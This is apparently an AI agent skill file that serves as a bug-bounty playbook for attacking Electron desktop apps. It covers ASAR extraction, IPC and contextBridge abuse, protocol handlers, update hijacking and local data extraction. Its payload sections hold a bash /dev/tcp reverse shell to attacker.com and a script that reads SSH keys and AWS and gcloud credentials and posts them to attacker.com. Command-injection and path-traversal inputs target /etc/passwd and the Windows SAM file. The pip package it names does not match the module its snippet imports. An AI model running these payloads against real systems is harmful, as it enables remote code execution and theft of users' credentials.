---
name: hunt-electron
description: Electron / desktop app security testing — Node.js integration abuse, contextIsolation bypass, preload script attacks, IPC injection, protocol handler hijacking, webview XSS→RCE, unsafe eval, remote module exploitation, asar archive extraction, autoupdate hijacking. Use on targets with desktop clients (Slack, Discord, VS Code style apps).
tags: [electron, desktop, nodejs, rce, ipc, contextIsolation, preload, xss-rce, protocol-handler, asar]
version: 1.0.0
license: MIT
triggers: [hunt, electron, desktop, nodejs, rce, ipc, contextIsolation, preload, xss-rce, protocol-handler, asar]
---

# Electron App Security Testing — Desktop Bug Bounty

## 1. ELECTRON SECURITY MODEL

```
Electron = Chromium browser + Node.js runtime
Security concerns:
- nodeIntegration: true → XSS = RCE (JS has full Node.js access)
- contextIsolation: false → renderer can access Node.js directly
- sandbox: false → no process sandbox
- webSecurity: false → CORS disabled, mixed content allowed
- allowRunningInsecureContent → HTTP in HTTPS context
```

### Quick Configuration Audit
```bash
# Extract app source (Electron apps ship as ASAR archive)
# Install: npm install -g asar

# Find app location
# Windows: C:\Users\USER\AppData\Local\APPNAME\
# macOS: /Applications/AppName.app/Contents/Resources/
# Linux: /opt/appname/resources/

# Extract ASAR
asar extract app.asar ./app_source
asar extract app.asar --unpack "*"  # Include native modules

# Find main process config
grep -r "nodeIntegration\|contextIsolation\|sandbox\|webSecurity\|allowRunningInsecureContent\|enableRemoteModule" app_source/

# Red flags:
# nodeIntegration: true   ← XSS = RCE
# contextIsolation: false ← No isolation
# sandbox: false          ← No sandbox
# enableRemoteModule: true ← Deprecated, dangerous
```

---

## 2. ASAR EXTRACTION & SOURCE ANALYSIS

```bash
# Full audit workflow
TARGET_APP="app.asar"
asar extract $TARGET_APP ./src

# Find hardcoded secrets
grep -r "apiKey\|api_key\|secret\|password\|token\|private_key\|aws_access" ./src/ --include="*.js"

# Find dangerous Node.js calls
grep -rn "eval\|Function(\|child_process\|exec(\|spawn(\|execSync\|require('child\|shell:true" ./src/

# Find IPC handlers (main process)
grep -rn "ipcMain.on\|ipcMain.handle" ./src/

# Find IPC calls (renderer)
grep -rn "ipcRenderer.send\|ipcRenderer.invoke" ./src/

# Find preload scripts
grep -rn "preload:" ./src/

# Find external content loading
grep -rn "loadURL\|loadFile\|webContents.loadURL" ./src/

# Find protocol handlers
grep -rn "registerProtocol\|setAsDefaultProtocolClient" ./src/

# Find autoupdate
grep -rn "autoUpdater\|electron-updater\|update-electron-app" ./src/
```

---

## 3. XSS → RCE VIA nodeIntegration

### If nodeIntegration: true
```javascript
// Any XSS in renderer process = direct Node.js RCE
// No need for anything special — Node APIs available directly

// RCE via XSS payload:
<script>
require('child_process').exec('calc.exe')
// OR on macOS:
require('child_process').exec('open -a Calculator')
// OR for reverse shell:
require('child_process').exec('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')
</script>

// Read sensitive files
<script>
const fs = require('fs');
const data = fs.readFileSync('/etc/passwd', 'utf8');
fetch('https://attacker.com/steal?d=' + btoa(data));
</script>

// List all credentials/secrets
<script>
const fs = require('fs');
const os = require('os');
const home = os.homedir();
// Read SSH keys, browser cookies, password manager files
['/.ssh/id_rsa', '/.aws/credentials', '/.config/gcloud/credentials.db'].forEach(path => {
  try {
    const data = fs.readFileSync(home + path, 'utf8');
    fetch('https://attacker.com/steal', {method: 'POST', body: JSON.stringify({path, data})});
  } catch(e) {}
});
</script>
```

---

## 4. CONTEXT ISOLATION BYPASS

### When contextIsolation: false
```javascript
// Renderer window shares JavaScript context with preload script
// Can access preload's exposed objects directly

// In browser console or XSS:
// Access objects exposed by preload
window.electronAPI  // Common naming
window.ipcRenderer  // If directly exposed (bad practice)

// Override functions in preload context
// If preload exposes dangerous functions via contextBridge misconfiguration:
window.myAPI.executeCommand = function(cmd) {
    // Real implementation in preload runs with Node.js access
    return window.myAPI._internal.exec(cmd);  // If accessible
};
```

### contextBridge Escape Patterns
```javascript
// Even with contextIsolation: true, contextBridge can be misconfigured

// VULNERABLE: exposing entire ipcRenderer
// preload.js:
contextBridge.exposeInMainWorld('electron', {
    ipcRenderer: ipcRenderer  // BAD - exposes entire IPC object
});

// Attack: Send arbitrary IPC messages to main process
window.electron.ipcRenderer.send('execute-command', 'calc.exe');

// VULNERABLE: exposing shell functions
contextBridge.exposeInMainWorld('api', {
    openExternal: (url) => shell.openExternal(url)  // If unrestricted
});

// Attack: Open attacker-controlled URL (possible protocol handler abuse)
window.api.openExternal('javascript:alert(1)');
// OR: custom protocol with command execution
window.api.openExternal('file:///etc/passwd');
```

---

## 5. IPC INJECTION ATTACKS

### Enumerate and Abuse IPC Channels
```javascript
// From renderer (in DevTools console or via XSS):

// List all possible IPC channels (if you have source)
// Grep: ipcMain.on('CHANNEL_NAME', handler)

// Send to common channel names
const channels = ['execute', 'shell', 'run-command', 'open-terminal', 
                   'write-file', 'read-file', 'spawn', 'system'];

// Test each channel
for (const ch of channels) {
    try {
        window.electron.ipcRenderer.send(ch, {cmd: 'id', args: []});
        window.electron.ipcRenderer.invoke(ch, 'id').then(console.log).catch(() => {});
    } catch(e) {}
}

// Real IPC exploitation example:
// Main process has: ipcMain.on('run-script', (event, script) => eval(script))
// Attack:
window.electron.ipcRenderer.send('run-script', 'require("child_process").exec("calc.exe")');
```

### IPC Input Validation Bypass
```javascript
// Main process validates: only allow specific commands
// ipcMain.on('execute', (event, cmd) => {
//   const allowed = ['ls', 'pwd', 'whoami'];
//   if (allowed.includes(cmd)) exec(cmd);
// });

// Bypass: command injection via allowed command
window.electron.ipcRenderer.send('execute', 'ls; calc.exe');
window.electron.ipcRenderer.send('execute', 'pwd && bash -c "reverse_shell"');
// Or: path traversal in file operations
window.electron.ipcRenderer.send('read-file', '../../../etc/passwd');
window.electron.ipcRenderer.send('read-file', '..\\..\\..\\Windows\\System32\\config\\SAM');
```

---

## 6. PROTOCOL HANDLER HIJACKING

### Custom Protocol Exploitation
```
Electron apps often register custom protocols:
slack://, discord://, vscode://, zoom://

Attack vectors:
1. XSS via protocol handler (if URL rendered as HTML)
2. RCE if protocol handler invokes Node.js code with URL content
3. OAuth token theft via custom protocol redirect_uri
```

### Testing Protocol Handlers
```javascript
// Windows: check registry for custom protocols
// HKEY_CLASSES_ROOT\slack\shell\open\command

// Test from browser:
// <a href="target-app://action?data=PAYLOAD">Click</a>
// target-app://action?data=<script>require('child_process').exec('calc')</script>

// OAuth + custom protocol:
// redirect_uri=target-app://oauth/callback
// Intercept OAuth code in custom protocol handler

// Protocol handler path traversal:
// target-app://open?file=../../../etc/passwd
// If handler does: shell.openItem(url.searchParams.get('file'))
```

---

## 7. WEBVIEW EXPLOITATION

### BrowserView / webContents Security
```javascript
// Check if webview has nodeIntegration:
// <webview src="https://evil.com" nodeintegration></webview>
// BAD - loads external content with Node.js access

// Webview XSS:
// If app loads user-supplied URLs in webContents:
app.loadURL('https://attacker.com/xss.html');
// XSS in external page + nodeIntegration = RCE

// Will-navigate / before-input-event bypass:
// Check if app intercepts navigation properly
// If webContents.on('will-navigate') not implemented → open redirect in webview
```

---

## 8. AUTO-UPDATE HIJACKING

```bash
# Electron auto-updater fetches updates from URL
# If update URL is HTTP (not HTTPS) → MITM attack

# Find update server
grep -r "feedURL\|update-url\|autoUpdater.setFeedURL\|updateURL" ./src/

# Common frameworks:
# electron-updater: reads update server from package.json "publish" field
# update-electron-app: uses GitHub Releases or S3

# Attack 1: MITM HTTP update feed
# If http://updates.target.com/latest.yml → intercept and serve malicious update

# Attack 2: Squirrel.Windows update format bypass
# latest.yml not signed → serve malicious binary with matching version

# Attack 3: GitHub Release MITM
# If app fetches from GitHub but GitHub token leaked → push malicious release

# Test: Can you modify latest.yml to point to attacker.com?
# If server not validating binary signature → supply chain RCE

# Verify: Does app check signature on downloaded update?
grep -r "verifySignature\|sha512\|certutil" ./src/
# If not → unsigned update accepted = RCE
```

---

## 9. SENSITIVE DATA IN ELECTRON

```bash
# Electron apps store sensitive data in predictable locations:

# Windows
%APPDATA%\AppName\          # App data
%LOCALAPPDATA%\AppName\     # Local data  
%APPDATA%\AppName\Local Storage\   # localStorage (IndexedDB)
%APPDATA%\AppName\Cookies          # Session cookies

# macOS
~/Library/Application Support/AppName/
~/Library/Application Support/AppName/Cookies
~/Library/Application Support/AppName/Local Storage/

# Extract localStorage (LevelDB format)
# Install: pip install ccl_chrome_indexeddb
python3 -c "
import ccl_chromium_localstorage
ls = ccl_chromium_localstorage.LocalStoreDb('/path/to/Local Storage/leveldb')
for origin, key, value in ls:
    print(f'{origin}: {key} = {value}')
"

# Extract Cookies (SQLite)
sqlite3 "$APPDATA/AppName/Cookies" "SELECT host_key, name, value FROM cookies;"

# Keychain/credential storage
# macOS: security find-generic-password -s "AppName"
# Windows: cmdkey /list → look for AppName entries
```

---

## 10. FULL ELECTRON AUDIT CHECKLIST

```
STATIC ANALYSIS:
[ ] Extract ASAR → inspect source
[ ] Check BrowserWindow options: nodeIntegration, contextIsolation, sandbox, webSecurity
[ ] Check preload scripts — what's exposed via contextBridge?
[ ] Find all IPC handlers (ipcMain.on/handle) — validate input?
[ ] Check update mechanism — HTTP or HTTPS? Signature verified?
[ ] Grep for hardcoded secrets, API keys, tokens
[ ] Check permissions requested (camera, microphone, notifications)
[ ] Find custom protocol handlers — user input sanitized?
[ ] Check webview usage — nodeIntegration? allowpopups?

DYNAMIC ANALYSIS:
[ ] Open DevTools (Ctrl+Shift+I or F12 — may be disabled)
[ ] If DevTools disabled: inject via --inspect flag or asar modification
[ ] Test XSS in any user-supplied content rendered by app
[ ] Test IPC channels with various payloads
[ ] Test protocol handler with malicious URLs
[ ] Test file operations for path traversal
[ ] Check network traffic — HTTP update feeds, insecure API calls
[ ] Test auto-update interception (MITM if HTTP)
[ ] Check local data storage for sensitive info
[ ] Test for electron-specific CVEs (check electron version vs CVE list)

COMMON ELECTRON CVEs:
[ ] CVE-2018-1000006: Protocol handler remote code execution
[ ] CVE-2018-15685: nodeIntegration bypass via about:blank  
[ ] CVE-2019-5786: Chrome sandbox escape (if sandbox: false)
[ ] CVE-2020-15213: Arbitrary file read
[ ] Check current electron version: cat package.json | grep '"electron"'
[ ] Check: https://electronjs.org/docs/latest/tutorial/security
```

---

## PAID BOUNTY EXAMPLES

| Target | Vuln | Payout |
|--------|------|--------|
| Slack | XSS → RCE via nodeIntegration | $1,500 (old) |
| Discord | XSS in markdown → RCE | $1,750 |
| VS Code | Protocol handler → arbitrary file read | $7,500 |
| Notion (desktop) | XSS → RCE via contextIsolation:false | $5,000 |
| Zoom | Local file read via custom protocol | $8,000 |
| Wire | IPC injection → credential theft | $3,000 |
| Mattermost | nodeIntegration bypass | $2,000 |
| Whatsapp Desktop | XSS in contact name → RCE | $12,500 |
